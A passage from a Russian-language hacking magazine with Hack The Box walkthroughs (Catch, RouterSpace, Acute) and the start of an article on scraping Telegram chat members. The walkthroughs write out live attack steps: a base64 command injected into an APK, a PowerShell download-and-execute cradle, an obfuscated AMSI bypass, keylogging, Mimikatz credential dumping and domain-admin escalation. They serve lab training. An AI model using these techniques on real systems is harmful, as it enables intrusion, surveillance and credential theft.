 #!/bin/bash
 ports=$( nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f
 1 | tr '\n' ',' | sed s/, $/ / )
 nmap -p$ports -A $1


Он действу ет в два этапа. На первом производит ся обычное быстрое сканиро-
вание, на втором — более тщатель ное сканирование, с исполь зованием име-
ющихся скриптов (опция -A).





                     Резуль тат работы скрипта

Мы наш ли несколь ко откры тых портов:
 • порт 22 — служба OpenSSH 8.2p1;
 • порты 80 и 8000 — служба веб-сервера Apache 2.4.41;
 • порты 3000 и 5000 — какие-то неизвестные приложения, работающие
   по протоколу HTTP.

Проходим к сайту на порте 80.





                     Главная страница сайта catch.htb

На сайте ничего необычного, скры того или полезного не находим, кроме того,
что пред лагается заг рузить какое-то приложение.





                   Ок но заг рузки приложения

После заг рузки видим, что это прог рамма для Android. На дру гих портах
работают Git (3000), чат Let’s Chat и плат форма Cachet.


ÒÎ×ÊÀ ÂÕÎÄÀ
Как создать и развернуть виртуаль ную машину Android, а затем включить
отладку, я уже писал в недавнем прохождении машины Routerspace, поэтому
сразу перейдем к установке приложения.


adb install catchv1.0.apk





                 Установка приложения с помощью ADB





                     Меню Android

При запуске приложения получаем ошибку соединения, а так же раскры ваем
новый под домен, который сразу добавляем в /etc/hosts.





                    Ошибка соединения


10.10.11.150    catch.htb status.catch.htb

Указан ный адрес ведет на порт 443, который на сервере зак рыт, поэтому поп-
робу ем вытянуть из приложения еще какие-нибудь дан ные. Для этого я буду
исполь зовать мини-песочницу для Android-приложений MobSF. В ней есть
возможность статического и динамического анализа. Если тебе неохота уста-
навливать макет на свой хост, то можно поль зовать ся уже разверну той он лай-
новой версией.





                         Главная панель MobSF

Заг ружаем приложение и получаем отчет по статическому анализу.





                Ин формация о заг ружен ном файле

Из важного сразу отмечаем забитые в приложение токены.





               Найден ные в приложении токены доступа

По второму токену определяем, что наша следующая цель — Let’s Chat. Встав-
ляем его как токен доступа в заголовок Authorization.





                  Изменен ный запрос на сервер


ÒÎ×ÊÀ ÎÏÎÐÛ
Чтобы этот токен автоматически вставлялся в каждый запрос, отправленный
через браузер, восполь зуем ся фун кцией match/replace в опциях Burp Proxy.
Там выбираем заголовок запроса в качестве типа и указываем замену пустого
поля нашим заголовком.





                     Опции Burp Proxy

Обновляем страницу чата в браузере, в резуль тате чего получаем редирект
на страницу /rooms и список групп.





                    Список групп поль зователя

Можем получить сообщения из группы, выполнив запрос на адрес /rooms/<
is>/messages.





                    Сообщения из группы

В группе 61b86b28d984e2451036eb17 находим пересланные учет ные дан ные
поль зователя john.





                Сообщение с учет ными дан ными

Пробуем ввести эту учет ку на всех веб-сервисах и получаем доступ к плат-
форме Cachet.





                  Форма авторизации Cachet





                         Главная страница Cachet




                                       Продолжение статьи →
                      ← НАЧАЛО СТАТЬИВЗЛОМ




               АНАЛИЗИРУЕМ И ПЕРЕКОМПИЛИРУЕМ
                     ПРИЛОЖЕНИЕ ДЛЯ ANDROID





ÏÐÎÄÂÈÆÅÍÈÅ
В настройках плат формы узнаем ее версию — 2.4.0-dev.





                  Парамет ры плат формы Cachet

Первым делом стоит проверить, есть ли для этой версии готовые эксплоиты.
Самый надежный способ сделать это — поискать в интернете на сайтах вроде
HackerOne, exploit-db и, конечно, GitHub.





                   Поиск эксплоитов в Google

В блоге Sonar описано несколь ко CVE. Нам интересна CVE-2021-39174,
которая позволит прочитать перемен ные среды.
   Зная номер CVE, мы найдем готовый эксплоит на GitHub.





                  Получение справки эксплоита

Эксплоиту нужно указать URL, имя поль зователя и пароль.


python3 exploit.py --url http://status.catch.htb:8000 -n john -p
'E}V!mywu_69T4C}W'





                  Получение перемен ных среды

С получен ными учет ными дан ными под ключаем ся к SSH и забираем первый
флаг.





                        Флаг поль зователя


ËÎÊÀËÜÍÎÅ ÏÎÂÛØÅÍÈÅ ÏÐÈÂÈËÅÃÈÉ
Теперь, ког да мы получили доступ к хосту, нам необходимо собрать информа-
цию. Делать мы это, как обычно, будем при помощи скриптов PEASS.




Что делать после того, как мы получили доступ в систему от имени поль зовате-
ля? Вариантов даль нейшей эксплу атации и повышения привилегий может быть
очень много, как в  Linux, так и в Windows. Чтобы собрать информацию
и наметить цели, можно исполь зовать Privilege Escalation Awesome Scripts
SUITE (PEASS) — набор скриптов, которые проверяют систему на автомате.


Заг рузим на хост скрипт для Linux, дадим права на исполнение и запустим его.
Из важного отметим найден ный скрипт на Bash /opt/mdm/verify.sh, а так же
файлы со списками доступа (ACLs).



                 Файл рута, доступный для чтения





                  Файлы со списком доступа

Боль ше ничего интересного нет, поэтому просмотрим, какие процессы пери-
одически могут запускать ся на хосте. В этом нам поможет прог рамма pspy64 .




                         Логи pspy64

От имени поль зователя root запускает ся найден ный нами скрипт. Разберем,
что он выполняет. Скрипт проходит по файлам в каталоге /opt/mdm/apk_bin,
копиру ет их в каталог /root/mdm/cerified_apps и передает в фун кции
sig_check, comp_check и app_check.





                    Основной код скрипта

В фун кции sig_check с помощью утилиты jarsigner проверяется под пись
файла.





                       Код фун кции sig_check

В фун кции comp_check утилита apktool декодирует файл, после чего из файла
AndroidManifest.xml парсится версия SDK.





                      Код фун кции comp_check

И в последней фун кции app_check из файла res/values/strings.xml пар-
сится название приложения, которое должно начинать ся с Catch. Резуль тат
вставляет ся в коман ду echo.





                      Код фун кции app_check

Это путь к выполнению кода, причем в кон тек сте поль зователя root. Все, что
нам нужно сделать, — это смастерить APK, который будет содержать файл
res/values/strings.xml и коман ду терминала в парамет ре app_name. После
чего этот файл нужно будет под писать.
  Но еще удобнее — деком пилировать скачан ный APK, внести изменения
и реком пилировать его. Для деком пиляции будем исполь зовать apktool .


apktool d -r -s catchv1.0.apk





                 Деком пилирование APK-файла

Теперь создадим файл /res/values/strings.xml, содержащий кон вейер
команд, который выполняет коман ду chmod u+s /bin/bash.


<string name="app_name">Catch|echo Y2htb2QgdStzIC9iaW4vYmFzaAo= |
base64 -d | bash</string>

Назначение S-бита файлу коман дной оболочки поможет запустить ее от имени
рута. Осталось собрать файл обратно с помощью того же apktool.


apktool b -f -d ./catchv1.0 -o ./catch_new.apk





                       Сборка файла APK

Теперь под пишем файл с помощью jarsigner и заг рузим на удален ный хост
в каталог /opt/mdm/apk_bin.


keytool -genkey -v -keystore r.keystore -alias alias_name -keyalg
RSA -keysize 2048 -validity 10000
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore .
/r.keystore ./catch_new.apk alias_name

Дождемся очеред ного выполнения скрипта, чтобы S-бит был назначен файлу
коман дной оболочки.



                      Права файла /bin/bash

Видим, что SUID выставлен, поэтому запускаем новый bash уже в привиле-
гирован ном кон тек сте и забираем флаг рута.





                            Флаг рута

Машина захвачена!
ВЗЛОМ





   ПОВЫШАЕМ ПРИВИЛЕГИИ ЧЕРЕЗ
             БАГ В SUDO





В этом рай тапе мы про ана лизи руем при-
ложение для  Android, что бы най ти  уяз-
вимость на сер вере, а затем повысим при-
вилегии с помощью уяз вимости в sudo.
Наша цель — захватить «лег кую» машину             RalfHacker                                                                                          hackerralf8@gmail.com
RouterSpace с пло щад ки Hack The Box.




                     Под ключаться к машинам с HTB рекомендует ся
                        только через VPN. Не делай этого с компьютеров,
                       где есть важ ные для тебя данные, так как ты ока-
                    жешься в общей сети с дру гими учас тни ками.



ÐÀÇÂÅÄÊÀ
Ñêàíèðîâàíèå ïîðòîâ
Добавляем IP-адрес машины в /etc/hosts, чтобы было удобнее обращать ся
к ней:


10.10.11.148    routerspace.htb

И запускаем сканирование портов.




Сканирование портов — стан дартный первый шаг при любой атаке. Он поз-
воляет атакующему узнать, какие службы на хосте принимают соединение.
На основе этой информации выбирается следующий шаг к получению точки
входа.
  Наиболее известный инстру мент для сканирования — это Nmap. Улучшить
резуль таты его работы ты можешь при помощи следующего скрипта.


 #!/bin/bash
 ports=$( nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f
 1 | tr '\n' ',' | sed s/, $/ / )
 nmap -p$ports -A $1


Он действу ет в два этапа. На первом производит ся обычное быстрое сканиро-
вание, на втором — более тщатель ное сканирование с исполь зованием име-
ющихся скриптов (опция -A).



#!/bin/bash
ports=$( nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1
| tr '\n' ',' | sed s/, $/ / )
nmap -p$ports -A $1





                     Резуль тат работы скрипта

Находим два откры тых порта: 22 — служба SSH и 80 — веб-сервер. Первым
делом, как обычно, ищем любую полезную информацию на сайте. Долго
искать не приш лось — находим ссылку на скачивание файла APK.





                         Главная страница сайта

Мы скачали приложение для Android, но нужна соот ветству ющая виртуаль ная
машина. Я буду исполь зовать AVD, который входит в Android Studio. Ниже при-
веду этапы разверты вания подобной «виртуалки».


ÒÎ×ÊÀ ÂÕÎÄÀ
Первым делом нужно выбрать тип и модель виртуаль ного девайса.





                     Вы бор устройства

Затем накатить нужную версию Android и принять кон фигурацию по умолчанию.





                     Вы бор версии ПО





                 Кон фигурации созданного устройства

Теперь в менед жере устройств должна отображать ся толь ко что созданная
виртуаль ная машина.





                   Менед жер устройств

Нам необходимо активировать режим разработ чика. Для этого, как и в реаль-
ном смартфоне, заходим в настройки: System → About и много раз нажимаем
на поле Build number.
  В кон це кон цов отобразит ся сообщение, что режим разработ чика активиро-
ван. В меню System появит ся новое меню Developer options.





                    System → About и новый System

В меню разработ чика следует активировать отладку по USB (USB debugging),
чтобы мы мог ли управлять устройством с помощью ADB.





                      Android Debug Bridge (ADB) — это уни версаль-
                     ный инс тру мент командной строки, который поз-
                        воля ет   вза имодей ствовать   с   устрой ством
                          Android. ADB упрощает выпол нение различных
                     дей ствий с устрой ством, таких  как уста новка
                      и отладка при ложений, а также предос тавля ет
                      дос туп к оболоч ке Unix, которую мож но исполь-
                        зовать  для  выпол нения  команд.  Под робнее
                       про ADB читай в статье « Иг ра вслепую. Управля-
                    ем Android-смартфоном через ADB ».


Сначала посмотрим под ключен ные устройства.


adb devices





                  Список под ключен ных устройств

Теперь установим скачан ное приложение. Сделать это просто:


adb install RouterSpace.apk





                   Установка приложения через ADB

И в меню нашего Android появит ся икон ка установленной APK. После запуска
увидим изображение роутера и кнопку для проверки статуса соединения.





                    Меню приложений





                     Приложение RouterSpace

При проверке статуса приложение отправляет какие-то дан ные по сети. Чтобы
узнать, что имен но оно отправляет, пропустим трафик через Burp Proxy.
Для этого в настройках Burp Proxy создадим новый Proxy Listener на VPN-
интерфейсе (у меня это tun0). Для прослушивания я указал порт 8081.





                       Настройка Burp Proxy

А так же установим эти настройки в AVD: Settings → Proxy.





                        Настройка AVD Proxy

И при следующей проверке статуса соединения увидим в Burp перехвачен ный
пакет.





                        Запрос в Burp Proxy


ÒÎ×ÊÀ ÎÏÎÐÛ
Ком бинацией клавиш Ctrl-R переведем запрос в Burp Repeater. Затем
выполним запрос и получим в ответ тот же адрес.





                    Тестовый запрос в Burp Repeater

Нужно проверить, действитель но ли сервер возвращает то, что мы ему прис-
лали, или под вергает дан ные дополнитель ной обработ ке. Для этого добавим
еще какие-нибудь слу чайные сим волы к дан ным в нашем запросе.





                    Тестовый запрос в Burp Repeater

И снова получаем то, что отправили. Толь ко добавляет ся сим вол перевода
строки \n. Это типично для коман ды echo. Вероятно, наш ввод передается
в коман дную оболочку. Попробу ем выполнить инъекцию коман ды id.





                      Инъекция коман ды id

Коман да успешно выполнилась! Осталось получить полноцен ную коман дную
оболочку. Попыт ки пробросить реверс-шелл оказались безуспешны, тог да я
коман дой ssh-keygen сгенерировал пару ключей SSH и записал публичный
на сервер в файл ~/.ssh/authorized_keys.





                       Запись SSH-ключа

А теперь под ключим ся с помощью приват ного ключа, получим сессию SSH
и заберем поль зователь ский флаг.





                        Флаг поль зователя


ËÎÊÀËÜÍÎÅ ÏÎÂÛØÅÍÈÅ ÏÐÈÂÈËÅÃÈÉ
Мы получили доступ к серверу, но от имени поль зователя. Теперь нужно соб-
рать как можно боль ше информации, чтобы понять, как добрать ся до рута.
Как всег да, восполь зуюсь скриптом PEASS.




Что делать после того, как мы получили доступ в систему от имени поль зовате-
ля? Вариантов даль нейшей эксплу атации и повышения привилегий может быть
очень много как в  Linux, так и в Windows. Чтобы собрать информацию
и наметить цели, можно исполь зовать Privilege Escalation Awesome Scripts
SUITE (PEASS) — набор скриптов, которые проверяют систему на автомате.



С помощью SSH заг рузим на хост скрипт для Linux.


scp -i id_rsa linpeas.sh paul@routerspace.htb:~/

После его выполнения на удален ном  хосте получаем огромный массив
информации. Но из полезного скрипт под свечивает нам версию sudo и ука-
зывает, что в ней есть уязвимость.




                         Версия sudo





                    Су ществу ющие уязвимости

Это  CVE-2021-3156 :  любой  непривилегирован ный  поль зователь  может
получить привилегии root на уязвимом хосте, исполь зуя кон фигурацию sudo
по умолчанию.
   Внут ри это устроено так. Судоер объединяет передан ные ему аргу мен ты
коман дной строки в буфер, выделен ный в куче. Однако если аргу мент коман-
дной строки  закан чивается одним сим волом обратной косой черты,  то
это вызывает ошибку в следующем блоке кода.


if (sudo_mode & (MODE_RUN | MODE_EDIT | MODE_CHECK)) {
...
    if (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) {
    ...
        for (to = user_args, av = NewArgv + 1; (from = *av); av++)
{
            while (*from) {
                if (from[0] == '\' && !isspace((unsigned char)from
[1]))
                    from++;
                *to++ = *from++;
             }
            *to++ = ' ';
        }
    ...
    }
...
}

Таким образом, если в нашем слу чае from[0] — это \, тог да from[1] будет
завершающим нуль-сим волом \0 (не пробелом), а это приведет к выполнению
условия  оператора  if.  Тог да  произойдет  смещение  указателя  from
на нуль-сим вол и копирование в перемен ную user_args (через to). Все
это приведет к копированию в эту перемен ную дан ных уже за пределами
буфера — то есть переполнению буфера в куче.
  Но чтобы попасть в этот уязвимый блок кода, судоер должен быть запущен
в режиме MODE_SHELL. Этого можно достичь, если при запуске указать опцию -
s или -i (она добавит дополнитель но MODE_LOGIN_SHELL). И помимо этого,
с одним из флагов MODE_RUN, MODE_EDIT (-e) и MODE_CHECK (-l).
  А теперь самое интересное: если выполняет ся следующее условие, то про-
изойдет экранирование всех метасим волов, включая обратную косую черту,
и уязвимый блок кода становит ся недостижимым!


if (ISSET(mode, MODE_RUN) && ISSET(flags, MODE_SHELL))

Сложность  в  том,  что мы  не можем  активировать режим  MODE_EDIT
или  MODE_CHECK  без  активации  MODE_RUN. Но можем  восполь зовать ся
sudoedit, который автоматически установит MODE_EDIT, но не MODE_RUN. Ну
а после получения уязвимости переполнения буфера в куче возможны разные
варианты.




                     Под робный   разбор   CVE-2021-3156   читай
                        в статье « Ког да всё супер. Повыша ем при вилегии
                     до суперпользователя через уязвимость».


Автоматическая эксплу атация этой уязвимости уже реализована в готовом экс-
плоите. Просто заг рузим скрипт на хост и выполним для получения привиле-
гирован ного кон тек ста.





                            Флаг рута

Машина захвачена!
ВЗЛОМ





     АТАКУЕМ ACTIVE DIRECTORY
    С ПОМОЩЬЮ COBALT STRIKE





В этом рай тапе я покажу ата ку на Active
Directorу с помощью популяр ного инстру-
мен та Cobalt Strike. Мы про ведем базовый
сбор информа ции, что бы получить пер-
воначальный  доступ,  затем  последим             RalfHacker                                                                                          hackerralf8@gmail.com
за дей стви ями пользователя, воору жив-
шись кей лог гером и скрин шотером, а так-
же рассмот рим один из методов прод-
вижения с использовани ем PowerShell.


Проходить мы будем машину Acute с площад ки Hack The Box. Уровень слож-
ности — hard.




                     Под ключаться к машинам с HTB рекомендует ся
                        только через VPN. Не делай этого с компьютеров,
                       где есть важ ные для тебя данные, так как ты ока-
                    жешься в общей сети с дру гими учас тни ками.



ÐÀÇÂÅÄÊÀ
Ñêàíèðîâàíèå ïîðòîâ
Добавляем IP-адрес машины в /etc/hosts:


10.10.11.145    acute.htb

И запускаем сканирование портов.




Сканирование портов — стан дартный первый шаг при любой атаке. Он поз-
воляет атакующему узнать, какие службы на хосте принимают соединение.
На основе этой информации выбирается следующий шаг к получению точки
входа.
  Наиболее известный инстру мент для сканирования — это Nmap. Улучшить
резуль таты его работы ты можешь при помощи следующего скрипта.


 #!/bin/bash
 ports=$( nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f
 1 | tr '\n' ',' | sed s/, $/ / )
 nmap -p$ports -A $1


Он действу ет в два этапа. На первом производит ся обычное быстрое сканиро-
вание, на втором — более тщатель ное сканирование, с исполь зованием име-
ющихся скриптов (опция -A).





                     Резуль тат работы скрипта

По резуль татам сканирования имеем всего один откры тый порт — 443, стан-
дартный для веб-сервера. Посколь ку на нем исполь зует ся SSL, мы можем
посмотреть сертификат и в поле commonName находим домен, для которого он
действителен. Nmap автоматически отображает это поле в резуль тате сканиро-
вания. Новый домен тоже добавим в /etc/hosts.


10.10.11.145    acute.htb atsserver.acute.local





                   Главная страница atsserver.acute.local

Идем осматривать сайт. Ссы лок на нем маловато, но одна из них ведет
на документ.





                       Страница с докумен том

Скачаем док для анализа: в нем может быть интересная информация.


ÒÎ×ÊÀ ÂÕÎÄÀ
В докумен те находим какой-то дефолтный пароль. Такие вещи всег да стоит
отмечать — при прохождении лабораторок они по закону жан ра обязаны
еще выстрелить.





               Содержимое скачан ного докумен та

Так же находим упоминание работы, а  чуть даль ше и ссылку на PSWA
(PowerShell Web Access). Эта фун кция позволяет удален но управлять сервером
с помощью PowerShell через обычный браузер. Домен ное имя из ссылки
добавим в файл /etc/hosts.


10.10.11.145    acute.htb atsserver.acute.local





Переходим по найден ной ссылке, и нам откры вает ся панель авторизации
PSWA.





                    Панель авторизации PSWA

У нас есть пароль, осталось найти имена поль зователя и машины.


ÒÎ×ÊÀ ÎÏÎÐÛ
Файлы вроде офисных докумен тов очень полезны при разведке. Их метадан-
ные могут содержать, к примеру, имя поль зователя и название машины.
Поэтому первым делом получим метадан ные скачан ного файла с помощью
Exiftool .





                  Метадан ные докумен та

Из поля Creator получаем имя поль зователя, а поле Description раскры вает
имя машины. Но с этими учет ными дан ными под ключить ся не получилось,
поэтому я пошел искать на сайте дру гие под сказки. И нашел... имена поль-
зователей.





                     Найден ные поль зователи

Формиру ем список по уже имеющемуся у нас формату.





                       Список аккаунтов

И с найден ным паролем на обозначен ной машине мы получаем коман дную
веб-оболочку PowerShell от имени поль зователя edavies.





                     Коман дная веб-оболочка

Для даль нейшей эксплу атации и прод вижения я решил исполь зовать популяр-
ный фреймворк Cobalt Strike. Первым делом создадим листенер.





                     Парамет ры листенера

Для удобной доставки наг рузки будем исполь зовать скрипт на PowerShell, рас-
положен ный на локаль ном веб-сервере.





                   Настройки Scripted Web Delivery

После настройки нам даже дадут коман ду, которую необходимо ввести
на целевой системе.


powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).
downloadstring('http://10.10.14.26:80/info'))"





                  Ошибка запуска наг рузки

Но нас останавливает антивирус, который триг гернул из-за AMSI.




Antimalware Scan Interface (AMSI) — это ком понент Microsoft Windows, который
обеспечивает более глу бокую проверку встроенных служб сценариев. Прод-
винутое вредоносное ПО исполь зует замаскирован ные или зашифрован ные
сценарии, чтобы уклонить ся от традиционных методов проверки. Такое вре-
доносное ПО  часто  заг ружается  непосредствен но  в  память,  поэтому
не исполь зует файлы на устройстве. AMSI — это интерфейс, через который
приложения и службы в Windows отправляют запросы на проверку установ-
ленному на компь ютере средству защиты от вредоносного ПО.



Но мы можем запат чить AMSI, чтобы исполь зуемый нами код не уходил на про-
верку. Метод зак лючается в изменении адресов заголовков amsiContext (кон-
текст, в котором происходит сканирование): зануляем указатель.


[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.
Encoding]::Unicode.GetString([Convert]::FromBase64String(
'QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::
Unicode.GetString([Convert]::FromBase64String(
'YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').
SetValue($null,$true)





                              Патч AMSI

И после повторного запуска наг рузки получаем активную сессию в нашем
фреймворке.





                        Граф сессий в CS




                                       Продолжение статьи →
                      ← НАЧАЛО СТАТЬИВЗЛОМ




                      АТАКУЕМ ACTIVE DIRECTORY
                  С ПОМОЩЬЮ COBALT STRIKE





ÏÐÎÄÂÈÆÅÍÈÅ
Получив кон троль над хостом, я сразу просмотрел запущен ные процессы
и сессии активных поль зователей.





                       Process Explorer в Cobalt Strike

Видим запущен ные процессы powershell.exe в первой сессии. Это значит,
что поль зователь авторизован и выполняет определен ные задачи. Чтобы
получить доступ к окру жению сессии, нам нужен кон троль над ней. Дру гими
словами, наш агент должен работать в той же сессии.
   Для этого я решил выполнить инъекцию наг рузки SMB beacon в процесс
explorer.exe. Но для начала нужно создать SMB-листенер.





                   Парамет ры SMB-листенера

Ког да листенер создан, можем прямо в Process Explorer «Кобаль та» найти
целевой процесс и выполнить инъекцию в него.





            Вы полнение инъекции в процесс explorer.exe

На графе связей мы должны увидеть новый агент.





                     Граф сессий Cobalt Strike

Так  как  поль зователь  запустил  PowerShell,  попробу ем  просмотреть  его
рабочий  стол.  Process  Explorer  позволяет  лег ко  запустить  скрин шотер.
При запуске нас спросят, хотим ли мы получать скрин шоты периодически (фун-
кция screenwatch), — отказываемся. После выполнения коман ды найдем
получен ное изображение в хранилище скрин шотов Cobalt Strike.





                  Хранилище скрин шотов Cobalt Strike

Видим, что поль зователь пытается под ключить ся к дру гому хосту с помощью
powershell enter-pssession. Эта коман да требует учет ных дан ных, которые
мы можем «под смот реть». Поэтому я запустил скрин шотер в потоковом
режиме, а так же активировал кейлог гер. Все это можно сделать прямо из бра-
узера процессов Cobalt Strike.
  Но ввод тянет ся невероятно долго. В ожидании я провел базовую разведку
в сети: получил хосты и поль зователей домена. Так мы будем лучше пред став-
лять себе потен циаль ные цели.


net computers





                     Список хостов в домене


shell net users /domain





                  Список поль зователей в домене

И вот наконец подоспели учет ные дан ные. Идея запустить кейлог гер была
хорошей, так как коман ду нужно теперь просто скопировать, а не перепечаты-
вать с картинки.





                  Хранилище скрин шотов Cobalt Strike





                   Хранилище кейлогов Cobalt Strike

У поль зователя под ключить ся не получилось, но и у меня тоже. Тог да пробуем
вместо enter-pssession исполь зовать invoke-command. Ниже — скрипт
для под ключения и соот ветству ющая коман да для Cobalt Strike.


$passwd = ConvertTo-SecureString "W3_4R3_th3_f0rce." -AsPlainText
-Force
$cred = New-Object System.Management.Automation.PSCredential (
"acute\imonks",$passwd)
Invoke-Command -computername ATSSERVER -ConfigurationName
dc_manage -credential $cred -command { ls C:\Users\imonks\Desktop
}


powershell $passwd = ConvertTo-SecureString "W3_4R3_th3_f0rce."
-AsPlainText -Force ; $cred = New-Object System.Management.
Automation.PSCredential ("acute\imonks" , $passwd) ; Invoke-Command
-computername ATSSERVER -ConfigurationName dc_manage -credential
$cred -command { ls C: \U sers \i monks \Desktop }





          Содержимое рабочего стола поль зователя imonks

На рабочем столе есть скрипт на PowerShell и флаг поль зователя, который мы,
естествен но, забираем (даль ше пишу толь ко основную коман ду).


type C: \U sers \i monks \Desktop\user.txt





                        Флаг поль зователя


ËÎÊÀËÜÍÎÅ ÏÎÂÛØÅÍÈÅ ÏÐÈÂÈËÅÃÈÉ
Так же мы получаем интересный скрипт на PowerShell:


C:\Users\imonks\Desktop\wm.ps1

Давай разберем ся с ним.





                  Содержимое файла wm.ps1

Этот скрипт нужен, чтобы под ключать ся к уже кон тролиру емому нами хосту
ACUTE-PC01 и выполнять коман ду Get-Volume.





                  Пример запуска скрипта wm.ps1

Так как скрипт отработал на ура, можно его изменить и выполнить свою коман-
ду. К примеру, запустить файл с наг рузкой. Проблема толь ко в том, что, если
закинуть файл на хост, его спалит антивирус. Давай просмотрим исключения
Windows Defender.


reg query x64 HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\
P aths





                    Исключения антивиру са

Это значит, что файлы в указан ных каталогах проверять ся не будут. Тог да
генерируем «маяк» SMB в формате исполняемого файла .exe и заг ружаем
в каталог C:\Utils\.
   Теперь займем ся изменением скрипта. Для работы нам нужна толь ко стро-
ка с выполнением коман ды, а все пред шеству ющие ей я сохраняю в файл
и импортирую с помощью коман ды powershell-import.


$passwd = ConvertTo-SecureString "W3_4R3_th3_f0rce." -AsPlainText
-Force
$cred = New-Object System.Management.Automation.PSCredential (
"acute\imonks",$passwd)

Для изменения удален ного скрипта будем исполь зовать цепочку команд: счи-
тываем содержимое файла, заменяем коман ду, записы ваем в файл.


Invoke-Command -computername ATSSERVER -ConfigurationName
dc_manage -credential $cred -command { ((cat "c:\users\imonks\
Desktop\wm.ps1" -Raw) -replace 'Get-Volume','cmd.exe /c C:\Utils\
b.exe') | set-content -path c:\users\imonks\Desktop\wm.ps1 }

После успешного изменения скрипта просто выполняем его.


Invoke-Command -computername ATSSERVER -ConfigurationName
dc_manage -credential $cred -ScriptBlock { C:\Users\imonks\
Desktop\wm.ps1 }

Теперь в списке процессов мы должны найти свой SMB-маяк, у меня это файл
b.exe.





                   Браузер процессов Cobalt Strike

Теперь просто под ключаем ся к SMB-наг рузке. Для этого коман де link ука-
зываем хост и имя SMB-пайпа (исполь зуемого при создании листенера).





                   Под ключение к SMB-наг рузке

В графе сессий появляет ся новая машина, причем молнии указывают, что маяк
работает с правами администратора.





                     Граф сессий Cobalt Strike


ÏÐÎÄÂÈÆÅÍÈÅ
Так как мы получили права администратора на одном из хостов, есть повод
поохотить ся за учет ными дан ными. Но сначала получим кон текст SYSTEM.
Один из способов сделать это — выполнить инъекцию в процесс, работающий
в этом кон тек сте. Я выбрал svchost.exe.





                   Браузер процессов Cobalt Strike





                     Граф сессий Cobalt Strike

Теперь, ког да у нас мак сималь ные права на хосте, исполь зуем популярную
утилиту Mimikatz, а точнее, модуль sekurlsa::logonpasswords.





               Исполь зование Mimikatz в Cobalt Strike

Mimikatz помог достать учет ные дан ные из процесса lsass.exe. Но есть еще и
база SAM, для работы с которой понадобит ся hashdump.





              Исполь зование hashdump в Cobalt Strike

Все  получен ные пароли и хеши  Cobalt  Strike  автоматически распарсит
и добавит в хранилище учет ных дан ных.





                Хранилище учет ных дан ных Cobalt Strike

У нас есть несколь ко хешей, но куда лучше знать их прообразы, то есть пароли
в чистом виде. Восполь зуем ся он лайн-сервисом для взлома NTLM-хешей
по уже готовым базам.





                        Взлом NTLM-хешей

Нам удается получить еще один пароль. Перебирая возможные ком бинации
имен поль зователей и паролей через powershell Invoke-Command, получаем
еще одного юзера — awallace : Password@123.


powershell $passwd = ConvertTo-SecureString "Password@123"
-AsPlainText -Force ; $cred = New-Object System.Management.
Automation.PSCredential ("acute\awallace" , $passwd) ; Invoke-
Command -computername ATSSERVER -ConfigurationName dc_manage
-credential $cred -command { whoami /all }





                 Вы полнение коман ды whoami


ÏÎÂÛØÅÍÈÅ ÏÐÈÂÈËÅÃÈÉ Â ÄÎÌÅÍÅ
Даль ше я пошел по своему чек-листу в поисках пути для повышения привиле-
гий. В дирек тории C:\program files\ нашелся каталог keepmeon, а в нем
файл .bat.





                 Содержимое С:\Program Files\





                        C:\program les\keepmeon\

Этот скрипт будет запускать все bat-файлы в текущем каталоге.





                Содержимое файла keepmeon.bat

Создадим бат ник admin.bat, который добавит текущего поль зователя в группу
администраторов домена (Domain Admins).


Invoke-Command -computername ATSSERVER -ConfigurationName
dc_manage -credential $cred -command { Set-Content -Path 'c:\
program files\Keepmeon\admin.bat' -Value 'net group "Domain
Admins" awallace /add /domain' }

Затем начинаем периодически проверять группы нашего поль зователя. И в
какой-то момент мы увидим группу Domain Admins.


shell whoami /groups





                          Группы поль зователя

И забираем флаг рута с удален ного хоста.


Invoke-Command -computername ATSSERVER -ConfigurationName
dc_manage -credential $cred -command { type C:\Users\
Administrator\Desktop\root.txt }





                            Флаг рута

Машина захвачена!
ПРИВАТНОСТЬ





 КАК СОБИРАТЬ ИМЕНА УЧАСТНИКОВ ЧАТОВ
                      В TELEGRAM





Недав но оку нул ся в вол шебный мир пар-
синга чатов в «Телег раме» и был удив лен,
сколько  одно тип ных  воп росов  зада ют,
какой низ кий уро вень понима ния у людей,
нуждающихся в пар синге, и как мно го раз-             Mazay                                                                                          stariy2003@yandex.ru
водов и зло упот реблений со сто роны тех,
кто берет ся предоставлять такую услу гу.
Посмотрев на это, я решил разобраться
самостоятельно.


В этой статье я постараюсь мак сималь но доступно даже для далеких от кодин-
га людей рассказать, что можно сделать, что нель зя и какова тру доем кость
всего процесса. Готовых исходников, правда, я тебе не выдам, но будут
неболь шие примеры для наг лядности.
   Как известно, в «Телег раме» есть чаты и каналы, куда, бывает, набивается
множество поль зователей. Иног да весь ма полезно иметь их список, например
для каких-то рассылок и приг лашений.
  Обычно под словом «парсинг» в кон тек сте телеги понимается имен но
получение списка поль зователей канала или чата. Реже — получение еще и
списка сообщений.


ÊÀÍÀËÛ

Начнем с каналов. Канал — это некий ресурс в «Телег раме», где юзеры толь ко
читают сообщения владель ца канала. Сами они ничего писать не могут
за исключением тех слу чаев, ког да к каналу привязан чат для ком ментариев.
Тог да у под писчиков появляет ся возможность ком ментировать сообщения
владель ца.
  Получить список под писчиков канала без привязан ного к нему чата с ком-
ментариями можно, толь ко если это твой канал и у него мень ше 200 под-
писчиков. Если хотя бы одно из этих условий не выполняет ся, парсинг недос-
тупен чисто технически и ник то не сможет его провести, что бы тебе ни обе-
щали. Возможно, в будущем появят ся какие-то новые способы — легаль ные
или с исполь зованием дыр, но пока рабочих способов нет.
   Если же чат с ком ментариями существу ет, то спарсить поль зователей ты
можешь точно так же, как в слу чае с любым дру гим чатом.
   Что касается списка сообщений в канале, то его можно получить как прог-
рам мно, через API «Телег рама», так и вручную, экспортировав список сооб-
щений с помощью штат ного клиента.





×ÀÒÛ

С чатами гораздо интереснее. Вручную вытащить список юзеров через стан-
дартный клиент не получит ся, разве что сидеть с блок нотом и ручкой
